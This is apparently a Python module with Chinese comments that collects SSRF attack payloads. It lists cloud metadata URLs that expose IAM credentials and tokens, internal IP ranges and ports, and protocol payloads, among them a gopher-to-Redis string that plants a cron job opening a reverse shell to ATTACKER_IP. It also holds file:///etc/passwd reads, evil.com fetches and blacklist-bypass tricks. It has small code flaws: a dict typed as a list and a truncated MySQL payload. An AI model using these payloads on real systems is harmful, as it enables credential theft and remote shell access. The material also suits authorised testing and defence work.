"""SSRF (Server-Side Request Forgery) Payload 生成器.

覆盖:
    - 内网探测 (10.x, 172.x, 192.168.x)
    - 云元数据 (AWS, GCP, Azure, Alibaba Cloud)
    - 协议利用 (gopher, dict, file)
    - Bypass 黑名单
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  云元数据地址
# ═══════════════════════════════════════════════════════════

CLOUD_METADATA: Dict[str, List[str]] = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "阿里云": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/user-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
    "腾讯云": [
        "http://metadata.tencentyun.com/latest/meta-data/",
        "http://169.254.0.23/latest/meta-data/",
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/user-data",
    ],
}


# ═══════════════════════════════════════════════════════════
#  内网地址段
# ═══════════════════════════════════════════════════════════

INTERNAL_RANGES: List[str] = [
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    "127.0.0.0/8",
    "169.254.0.0/16",   # AWS / 云元数据
    "0.0.0.0",
    "localhost",
    "[::1]",
    "[::ffff:127.0.0.1]",
]

COMMON_INTERNAL_PORTS: Dict[str, List[int]] = {
    "Web 服务": [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000],
    "数据库": [3306, 5432, 1433, 1521, 6379, 27017, 9200],
    "缓存/消息": [11211, 5672, 15672],
    "运维/管理": [22, 3389, 5900, 2375, 2376],
    "其他": [25, 53, 110, 143, 993, 995],
}


# ═══════════════════════════════════════════════════════════
#  协议利用 & Bypass
# ═══════════════════════════════════════════════════════════

PROTOCOL_PAYLOADS: List[Dict[str, str]] = {
    "gopher:// (Redis)": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1%0a%0d%0a%0d%0a",
    "gopher:// (MySQL)": "gopher://127.0.0.1:3306/_...",
    "dict://": "dict://127.0.0.1:6379/info",
    "file://": "file:///etc/passwd",
    "ftp://": "ftp://evil.com/file",
    "sftp://": "sftp://evil.com:22/file",
    "tftp://": "tftp://evil.com:69/file",
}


SSRF_BYPASS: List[Dict[str, str]] = [
    {"technique": "DNS 重绑定", "payload": "用 TTL=0 的 DNS 将域名轮换解析到 127.0.0.1 和外网IP"},
    {"technique": "URL 解析差异", "payload": "http://127.0.0.1:80@evil.com/  (有些库把 @ 前面当认证信息)"},
    {"technique": "短网址重定向", "payload": "用 tinyurl.com / bit.ly 指向 127.0.0.1"},
    {"technique": "30x 重定向", "payload": "将你的服务器设 302 重定向到内网地址"},
    {"technique": "进制/编码", "payload": "127.0.0.1 → 2130706433 (十进制) → 0x7f.0.0.1 (十六进制) → 0177.0.0.1 (八进制)"},
    {"technique": "IPv6 映射", "payload": "http://[::ffff:127.0.0.1]/"},
    {"technique": "Unicode 混淆", "payload": "127。0。0。1 (全角句号) → 某些库可能解析为 127.0.0.1"},
    {"technique": "封闭式字母数字", "payload": "①②⑦","note": "使用 Unicode 封闭式字母数字"},
    {"technique": "DNS AAAA 记录", "payload": "用 IPv6 DNS 记录绕过 IPv4 黑名单"},
    {"technique": "localhost 变体", "payload": "localhost → localhost. → localtest.me → spoofed.burpcollaborator.net"},
]


def get_cloud_metadata(provider: str = "") -> dict:
    """获取云元数据地址."""
    if provider and provider in CLOUD_METADATA:
        return {provider: CLOUD_METADATA[provider]}
    return CLOUD_METADATA


def get_internal_ranges() -> List[str]:
    """获取内网地址段."""
    return INTERNAL_RANGES


def get_common_ports() -> dict:
    """获取常见内网端口."""
    return COMMON_INTERNAL_PORTS


def get_protocols() -> list:
    """获取协议利用 Payload."""
    return PROTOCOL_PAYLOADS


def get_bypass() -> list:
    """获取 SSRF 绕过技巧."""
    return SSRF_BYPASS
